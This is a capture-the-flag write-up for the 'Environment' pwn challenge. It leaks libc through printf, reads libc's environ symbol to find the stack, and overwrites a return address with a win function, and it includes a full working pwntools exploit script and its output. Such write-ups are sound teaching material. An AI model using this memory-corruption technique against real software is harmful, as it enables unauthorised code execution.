# Environment

The description for this challenge is as follows:

*Extraterrestrial creatures have landed on our planet and drain every resource possible! Rainforests are being destroyed, the oxygen runs low, materials are hard to find. We need to protect our environment at every cost, otherwise there will be no future for humankind..
This challenge will raise 43 euros for a good cause.*

This challenge was rated two out of four stars. I would say that the main difficulties involved were in reverse engineering to figure out what to do and in knowing/figuring out a specific trick to leak a stack address.

**TL;DR Solution:** I used the binary's existing functionality to leak the libc address of printf, then I was able to use that to derive the libc base and leak the stack address of the environment variable. This then allows me to overwrite the return address to poin to a win function and get the flag.

So, we first run the program. Interestingly enough, it actually segfaults on the Plant option if we give it the normal numeric input:
```
knittingirl@piglet:~/CTF/HTBApocalypse/environment$ ./environment 

🌲 Save the environment ♻

            *
           ***
          *****
         *******
        *********
       ***********
      *************
     ***************
           | |
           | |
           | |


1. Plant a 🌲

2. Recycle ♻
> 2
Recycling will help us craft new materials.
What do you want to recycle?

1. Paper 📜

2. Metal 🔧
> 1
Is this your first time recycling? (y/n)
> y

Thank you very much for participating in the recycling program!

1. Plant a 🌲

2. Recycle ♻
> 1

Trees will provide more oxygen for us.
What do you want to plant?

1. 🌴

2. 🌳
> 1

Where do you want to plant?
1. City
2. Forest
> 1
Thanks a lot for your contribution!
Segmentation fault

```
Running checksec indicates that all of the protections are enabled except PIE:
```
knittingirl@piglet:~/CTF/HTBApocalypse/environment$ checksec environment
[*] '/home/knittingirl/CTF/HTBApocalypse/environment/environment'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
The next step is reverse engineer the binary with Ghidra. It should immediately be noted that the hidden_resources function exists, and it appears to print off the contents of a flag.txt file, making it a clear win function.

The plant() function is very interesting; it looks like allows us to do an arbitrary overwrite of up to 16 bytes by specifying the location to overwrite to in response to "What do you want to plant?", and the value to overwrite with in response to "Where do you want to plant?":

```
  check_fun((ulong)rec_count);
  color(
        "\nTrees will provide more oxygen for us.\nWhat do you want to plant?\n\n1. 🌴\n\n2. 🌳\n"
        ,"green");
  printf("> ");
  read(0,local_48,0x10);
  puVar1 = (ulonglong *)strtoull(local_48,(char **)0x0,0);
  putchar(10);
  color("Where do you want to plant?\n1. City\n2. Forest\n","green");
  printf("> ");
  read(0,local_28,0x10);
  puts("Thanks a lot for your contribution!");
  uVar2 = strtoull(local_28,(char **)0x0,0);
  *puVar1 = uVar2;
  rec_count = 0x16;
```

My initial thought was to overwrite an entry in the GOT table or the .fini array with the address of hidden_resources(). This would have been a great idea if not for the fact that Full RELRO is enabled, which means that those areas of memory are not writable.

So, at this point, I moved on to looking at the recycle option. The recycle() function calls form() if you enter 1 or 2, and it just prints off "We are doomed" if you enter anything else. The form() function iterates the global variable rec_count up by 1 every time we select n in response to the "Is this your first time recycling?" question. If rec_count hits 5, it will just automatically leak the libc address of printf. If it hits 10, it will leak the contents of any spot in memory that we choose.
```
  local_2c = 0;
  color("Is this your first time recycling? (y/n)\n> ","magenta");
  read(0,&local_2c,3);
  putchar(10);
  if (((char)local_2c == 'n') || ((char)local_2c == 'N')) {
    rec_count = rec_count + 1;
  }
  if (rec_count < 5) {
    color("Thank you very much for participating in the recycling program!\n","magenta");
  }
  else {
    if (rec_count < 10) {
      color("You have already recycled at least 5 times! Please accept this gift: ","magenta");
      printf("[%p]\n",printf);
    }
    else {
      if (rec_count == 10) {
        color("You have recycled 10 times! Feel free to ask me whatever you want.\n> ","cyan");
        read(0,local_28,0x10);
        __s = (char *)strtoull(local_28,(char **)0x0,0);
        puts(__s);
      }
    }
  }
```
When thinking this challenge, I eventually decided that overwriting the return pointer directly was the way to go on this one. There is a technique to overwrite the GOT table with Full RELRO enabled using a malloc hook (see here for more on that: https://made0x78.com/bseries-fullrelro/) but I decided that I didn't seem to have the necessary components to make that work, plus it had nothing to do with the seeming hint of a title like "Environment". 

After some time, I discovered an excellent technique that was clearly perfect based on what we have already learned (Thank you Naetw, see here: https://github.com/Naetw/CTF-pwn-tips#leak-stack-address). Basically, there is a symbol called environ in libc that points to the location of the environment variable in your program, which is located on the stack. This means that I can derive the address of environ in libc based on the printf leak, then leak its contents to get a stack leak. Then I just need to figure out the offset from the leak to the actual return (this is fairly straightforward in GDB), and I'll be able to overwrite its contents to the address of hidden_resources() by using the plant function. The full exploit script is below:
```
from pwn import *

target = process('./environment', env={"LD_PRELOAD":"./libc.so.6"})
#target = remote('165.227.231.249', 30917)

pid = gdb.attach(target, "\nb *plant+240\nb *form+316\n set disassembly-flavor intel\ncontinue")



elf = ELF("environment")
libc = ELF("libc.so.6")
#Gadgets:

hidden_resources = 0x004010b5

def recycle_no():
	print(target.recvuntil(b'2. Recycle'))
	target.sendline(b'2')
	print(target.recvuntil(b'What do you want to recycle?'))

	target.sendline(b'1')
	print(target.recvuntil(b'Is this your first time recycling? (y/n)'))
	target.sendline(b'n')
	
for i in range(5):
	recycle_no()

print(target.recvuntil(b' Please accept this gift: \x1b[0m['))
leak = target.recvuntil(b']\n\x1b')
printf_libc_str = leak.replace(b']\n\x1b', b'')

printf_libc = int(printf_libc_str, 16)
print('printf_libc is', hex(printf_libc))

libc_base = printf_libc - libc.symbols['printf']
environ = libc_base + libc.symbols['environ']

target.sendline(b'2')
print(target.recvuntil(b'What do you want to recycle?'))
#Note: 1 or 2 makes little difference; if I select neither, it prints we are doomed and doesn't execute form
target.sendline(b'1')
print(target.recvuntil(b'Is this your first time recycling? (y/n)'))
target.sendline(b'n')

for i in range(4):
	recycle_no()

print(target.recvuntil(b'whatever you want.'))
target.sendline(str(environ).encode())

result = target.recvuntil(b'1. Pl')
stack_leak = result.replace(b'1. Pl', b'').replace(b'\n> \x1b[0m', b'').replace(b'\n\x1b[1;0;32m\n', b'')

print(stack_leak)
print(len(stack_leak))
stack = u64(stack_leak + (8 - len(stack_leak)) * b'\x00')
print('stack', hex(stack))

overwrite_point = stack - 288

#Code to do the overwrite once I've figured out what should go in there...
print(target.recvuntil(b'2. Recycle'))
target.sendline(b'1')
print(target.recvuntil(b'2. '))
target.sendline(str(overwrite_point).encode())
print(target.recvuntil(b'2. Forest'))

target.sendline(str(hidden_resources).encode())


target.interactive()

```

And the ouput should look like this:

```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/environment$ python3 environment_payload.py
[+] Opening connection to 165.227.231.249 on port 30917: Done
[*] '/home/ubuntu/CTF/HTBApocalypse/environment/environment'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ubuntu/CTF/HTBApocalypse/environment/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
935776
b'\x1b[1;32m\n\xf0\x9f\x8c\xb2 Save the environment \xe2\x99\xbb\n\n\x1b[0m\x1b[1;5;32m            *\n           ***\n          *****\n         *******\n        *********\n       ***********\n      *************\n     ***************\n           | |\n           | |\n           | |\n\n\x1b[0m\x1b[1;32766;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32766;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32749;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32749;35mThank you very much for participating in the recycling program!\n\x1b[0m\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32749;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32749;35mThank you very much for participating in the recycling program!\n\x1b[0m\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32749;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32749;35mThank you very much for participating in the recycling program!\n\x1b[0m\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32749;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32749;35mThank you very much for participating in the recycling program!\n\x1b[0m\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32749;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32749;35mYou have already recycled at least 5 times! Please accept this gift: \x1b[0m['
printf_libc is 0x7fed1630cf70
b'[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32766;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32766;35mYou have already recycled at least 5 times! Please accept this gift: \x1b[0m[0x7fed1630cf70]\n\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32766;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32766;35mYou have already recycled at least 5 times! Please accept this gift: \x1b[0m[0x7fed1630cf70]\n\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32766;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32766;35mYou have already recycled at least 5 times! Please accept this gift: \x1b[0m[0x7fed1630cf70]\n\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32766;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32766;35mYou have already recycled at least 5 times! Please accept this gift: \x1b[0m[0x7fed1630cf70]\n\x1b[1;32749;32m\n1. Plant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;32749;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;0;36mRecycling will help us craft new materials.\nWhat do you want to recycle?'
b'\n\n1. Paper \xf0\x9f\x93\x9c\n\n2. Metal \xf0\x9f\x94\xa7\n\x1b[0m> \x1b[1;32766;35mIs this your first time recycling? (y/n)'
b'\n> \x1b[0m\n\x1b[1;32766;36mYou have recycled 10 times! Feel free to ask me whatever you want.'
b'8\xf5\xb3\xe0\xfe\x7f'
6
stack 0x7ffee0b3f538
b'ant a \xf0\x9f\x8c\xb2\n\x1b[0m\x1b[1;0;36m\n2. Recycle'
b' \xe2\x99\xbb\n\x1b[0m> \x1b[1;32766;32m\nTrees will provide more oxygen for us.\nWhat do you want to plant?\n\n1. \xf0\x9f\x8c\xb4\n\n2. '
b'\xf0\x9f\x8c\xb3\n\x1b[0m> \n\x1b[1;32766;32mWhere do you want to plant?\n1. City\n2. Forest'
[*] Switching to interactive mode

> Thanks a lot for your contribution!
You found a hidden vault with resources. You are very lucky!
CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}

```
